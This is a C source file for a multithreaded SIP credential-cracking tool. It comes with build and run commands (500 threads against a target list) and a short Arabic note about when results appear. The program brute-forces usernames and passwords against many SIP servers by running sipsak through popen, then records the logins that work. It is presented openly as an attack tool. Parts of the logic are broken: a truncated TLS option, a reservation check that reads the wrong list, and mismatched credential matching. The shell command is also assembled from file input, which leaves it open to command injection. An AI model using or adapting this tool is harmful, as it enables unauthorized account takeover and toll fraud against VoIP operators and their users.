gcc crack.c -o crack -pthread
./crack --protocol 1 --threads 500 --targets 500 --targets-file ip.txt --user-pass-file User_Pass --success-file success.txt --reservation-file reservations.txt

=====================================
النتائج الناجحة تظهر بعد الانتهاء من الكراك تماما

#include <stdio.h>
#include <stdlib.h>
#include <getopt.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>

#define PROTOCOL_TCP 0
#define PROTOCOL_UDP 1
#define PROTOCOL_TLS 2
#define MAX_LINE_SIZE 1024

typedef struct {
    char ip[100];
    int port;
} Target;

typedef struct {
    char username[100];
    char password[100];
} UserPass;

int protocol = PROTOCOL_TCP;
int num_threads = 10;
int num_targets = 5000;
char targets_file[MAX_LINE_SIZE] = "ip.txt";
char user_pass_file[MAX_LINE_SIZE] = "User_Pass";
char success_file[MAX_LINE_SIZE] = "Success_results.txt";
char reservation_file[MAX_LINE_SIZE] = "reservations_targets.txt";
Target* targets;
int num_user_pass;
UserPass* user_passes;
pthread_mutex_t success_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t reservation_mutex = PTHREAD_MUTEX_INITIALIZER;

typedef struct {
    char ip[100];
    int port;
} SuccessTarget;

SuccessTarget* successful_targets;
int num_successful_targets = 0;

UserPass* successful_credentials;
int num_successful_credentials = 0;

Target* read_targets(const char* filename, int* num_targets);
UserPass* read_user_pass(const char* filename, int* num_user_pass);
void print_usage();
int is_target_successful(const char* ip, int port);
int is_credential_successful(const char* username, const char* password);
int is_target_reserved(const char* ip, int port);
void add_target_to_success(const char* ip, int port);
void add_credential_to_success(const char* username, const char* password);
void add_target_to_reservation(const char* ip, int port);
void write_successful_attempts(const char* filename);
void sip_crack(Target* target, UserPass* user_pass);
void* thread_function(void* arg);

Target* read_targets(const char* filename, int* num_targets) {
    FILE* file = fopen(filename, "r");
    if (!file) {
        perror("Failed to open targets file");
        exit(EXIT_FAILURE);
    }

    Target* targets = malloc(sizeof(Target) * 10000);
    *num_targets = 0;
    char line[MAX_LINE_SIZE];
    while (*num_targets < 10000 && fgets(line, sizeof(line), file)) {
        sscanf(line, "%[^:]:%d", targets[*num_targets].ip, &targets[*num_targets].port);
        (*num_targets)++;
    }
    fclose(file);
    return targets;
}

UserPass* read_user_pass(const char* filename, int* num_user_pass) {
    FILE* file = fopen(filename, "r");
    if (!file) {
        perror("Failed to open username and password file");
        exit(EXIT_FAILURE);
    }

    UserPass* user_passes = malloc(sizeof(UserPass) * 10000);
    *num_user_pass = 0;
    char line[MAX_LINE_SIZE];
    while (*num_user_pass < 10000 && fgets(line, sizeof(line), file)) {
        sscanf(line, "%[^:]:%s", user_passes[*num_user_pass].username, user_passes[*num_user_pass].password);
        (*num_user_pass)++;
    }
    fclose(file);
    return user_passes;
}

void print_usage() {
    printf("Usage: ./crack [options]\n"
           "Options:\n"
           "    -p, --protocol <PROTOCOL_TCP, PROTOCOL_UDP, PROTOCOL_TLS>\n"
           "    -t, --threads <number of threads>\n"
           "    -T, --targets <number of targets>\n"
           "    -f, --targets-file <file with targets>\n"
           "    -u, --user-pass-file <file with usernames and passwords>\n"
           "    -s, --success-file <file to write successful attempts>\n"
           "    -r, --reservation-file <file to write reservations>\n"
           "    -h, --help\n");
}

int is_target_successful(const char* ip, int port) {
    for (int i = 0; i < num_successful_targets; i++) {
        if (strcmp(successful_targets[i].ip, ip) == 0 && successful_targets[i].port == port) {
            return 1;
        }
    }
    return 0;
}

int is_credential_successful(const char* username, const char* password) {
    for (int i = 0; i < num_successful_credentials; i++) {
        if (strcmp(successful_credentials[i].username, username) == 0 && strcmp(successful_credentials[i].password, password) == 0) {
            return 1;
        }
    }
    return 0;
}

int is_target_reserved(const char* ip, int port) {
    for (int i = 0; i < num_successful_targets; i++) {
        if (strcmp(successful_targets[i].ip, ip) == 0 && successful_targets[i].port == port) {
            return 1;
        }
    }
    return 0;
}

void add_target_to_success(const char* ip, int port) {
    pthread_mutex_lock(&success_mutex);
    successful_targets = realloc(successful_targets, sizeof(SuccessTarget) * (num_successful_targets + 1));
    strcpy(successful_targets[num_successful_targets].ip, ip);
    successful_targets[num_successful_targets].port = port;
    num_successful_targets++;
    pthread_mutex_unlock(&success_mutex);

    FILE* file = fopen(success_file, "a");
    if (!file) {
        perror("Failed to open success file");
        exit(EXIT_FAILURE);
    }

    fprintf(file, "SUCCESS: %s:%d\n", ip, port);
    fclose(file);
}

void add_credential_to_success(const char* username, const char* password) {
    pthread_mutex_lock(&success_mutex);
    successful_credentials = realloc(successful_credentials, sizeof(UserPass) * (num_successful_credentials + 1));
    strcpy(successful_credentials[num_successful_credentials].username, username);
    strcpy(successful_credentials[num_successful_credentials].password, password);
    num_successful_credentials++;
    pthread_mutex_unlock(&success_mutex);

    FILE* file = fopen(success_file, "a");
    if (!file) {
        perror("Failed to open success file");
        exit(EXIT_FAILURE);
    }

    fprintf(file, "SUCCESS: %s:%s\n", username, password);
    fclose(file);
}

void add_target_to_reservation(const char* ip, int port) {
    pthread_mutex_lock(&reservation_mutex);
    successful_targets = realloc(successful_targets, sizeof(SuccessTarget) * (num_successful_targets + 1));
    strcpy(successful_targets[num_successful_targets].ip, ip);
    successful_targets[num_successful_targets].port = port;
    num_successful_targets++;
    pthread_mutex_unlock(&reservation_mutex);
}

void write_successful_attempts(const char* filename) {
    FILE* file = fopen(filename, "w");
    if (!file) {
        perror("Failed to open success file");
        exit(EXIT_FAILURE);
    }

    // Loop through successful targets and write them to the file
    for (int i = 0; i < num_successful_targets; i++) {
        // Write target ip:port
        fprintf(file, "%s:%d ", successful_targets[i].ip, successful_targets[i].port);

        // Find corresponding credentials for the target
        int found_credentials = 0;
        for (int j = 0; j < num_successful_credentials; j++) {
            if (strcmp(successful_credentials[j].username, successful_targets[i].ip) == 0 &&
                atoi(successful_credentials[j].password) == successful_targets[i].port) {
                // Write the username:password
                fprintf(file, "%s:%s", successful_credentials[j].username, successful_credentials[j].password);
                found_credentials = 1;
                break;
            }
        }

        // If no credentials were found, write "N/A"
        if (!found_credentials) {
            fprintf(file, "N/A");
        }

        // Write newline after each target
        fprintf(file, "\n");
    }

    fclose(file);
}

void sip_crack(Target* target, UserPass* user_pass) {
    if (is_target_reserved(target->ip, target->port)) {
        printf("Target %s:%d is reserved, skipping...\n", target->ip, target->port);
        return;
    }

    if (is_target_successful(target->ip, target->port)) {
        printf("Target %s:%d is successful, skipping...\n", target->ip, target->port);
        return;
    }

    if (is_credential_successful(user_pass->username, user_pass->password)) {
        printf("Credentials %s:%s are successful, skipping...\n", user_pass->username, user_pass->password);
        return;
    }

    char command[MAX_LINE_SIZE];
    char protocol_str[10];

    if (protocol == PROTOCOL_TCP) {
        strncpy(protocol_str, "tcp", sizeof(protocol_str) - 1);
    } else if (protocol == PROTOCOL_UDP) {
        strncpy(protocol_str, "udp", sizeof(protocol_str) - 1);
    } else if (protocol == PROTOCOL_TLS) {
        strncpy(protocol_str, "tls --tls-ignore-cert-failure", sizeof(protocol_str) - 1);
    } else {
        fprintf(stderr, "Invalid protocol specified.\n");
        return;
    }

    snprintf(command, sizeof(command), "sipsak -U -C sip:%s@%s -s sip:%s@%s:%d -u %s -a %s -H %s -i -vvv -E %s 2>&1",
             user_pass->username, target->ip,
             user_pass->username, target->ip, target->port,
             user_pass->username, user_pass->password,
             target->ip, protocol_str);

    printf("Running command: %s\n", command);

    FILE* pipe = popen(command, "r");
    if (!pipe) {
        perror("Failed to open pipe");
        return;
    }

    struct timeval timeout;
    timeout.tv_sec = 5;
    timeout.tv_usec = 0;

    fd_set fds;
    FD_ZERO(&fds);
    FD_SET(fileno(pipe), &fds);

    int select_result = select(fileno(pipe) + 1, &fds, NULL, NULL, &timeout);

    if (select_result == -1) {
        perror("select error");
    } else if (select_result == 0) {
        printf("Timeout occurred for target %s:%d\n", target->ip, target->port);
    } else {
        char buffer[MAX_LINE_SIZE];
        while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
            printf("Command Output: %s", buffer);

            if (strstr(buffer, "200 OK") || strstr(buffer, "202 Accepted") || strstr(buffer, "204 No Notification")) {
                printf("Success: %s\n", buffer);
                add_target_to_success(target->ip, target->port);
                add_credential_to_success(user_pass->username, user_pass->password);
                add_target_to_reservation(target->ip, target->port);
                break;
            }
        }
    }

    pclose(pipe);
}

void* thread_function(void* arg) {
    int thread_id = *(int*)arg;
    int targets_per_thread = num_targets / num_threads;
    int start = thread_id * targets_per_thread;
    int end = (thread_id == num_threads - 1) ? num_targets : (thread_id + 1) * targets_per_thread;

    for (int i = start; i < end; i++) {
        for (int j = 0; j < num_user_pass; j++) {
            sip_crack(&targets[i], &user_passes[j]);
        }
    }

    return NULL;
}

int main(int argc, char* argv[]) {
    static struct option long_options[] = {
        {"protocol", required_argument, NULL, 'p'},
        {"threads", required_argument, NULL, 't'},
        {"targets", required_argument, NULL, 'T'},
        {"targets-file", required_argument, NULL, 'f'},
        {"user-pass-file", required_argument, NULL, 'u'},
        {"success-file", required_argument, NULL, 's'},
        {"reservation-file", required_argument, NULL, 'r'},
        {"help", no_argument, NULL, 'h'},
        {NULL, 0, NULL, 0}
    };

    int opt;
    while ((opt = getopt_long(argc, argv, "p:t:T:f:u:s:r:h", long_options, NULL)) != -1) {
        switch (opt) {
            case 'p':
                protocol = atoi(optarg);
                break;
            case 't':
                num_threads = atoi(optarg);
                break;
            case 'T':
                num_targets = atoi(optarg);
                break;
            case 'f':
                strncpy(targets_file, optarg, sizeof(targets_file) - 1);
                break;
            case 'u':
                strncpy(user_pass_file, optarg, sizeof(user_pass_file) - 1);
                break;
            case 's':
                strncpy(success_file, optarg, sizeof(success_file) - 1);
                break;
            case 'r':
                strncpy(reservation_file, optarg, sizeof(reservation_file) - 1);
                break;
            case 'h':
            default:
                print_usage();
                return EXIT_SUCCESS;
        }
    }

    targets = read_targets(targets_file, &num_targets);
    user_passes = read_user_pass(user_pass_file, &num_user_pass);
    successful_targets = malloc(0);
    successful_credentials = malloc(0);

    pthread_t threads[num_threads];
    int thread_ids[num_threads];
    for (int i = 0; i < num_threads; i++) {
        thread_ids[i] = i;
        if (pthread_create(&threads[i], NULL, thread_function, &thread_ids[i]) != 0) {
            perror("Failed to create thread");
            exit(EXIT_FAILURE);
        }
    }

    for (int i = 0; i < num_threads; i++) {
        if (pthread_join(threads[i], NULL) != 0) {
            perror("Failed to join thread");
            exit(EXIT_FAILURE);
        }
    }

    write_successful_attempts(success_file);
    free(targets);
    free(user_passes);
    free(successful_targets);
    free(successful_credentials);

    return EXIT_SUCCESS;
}
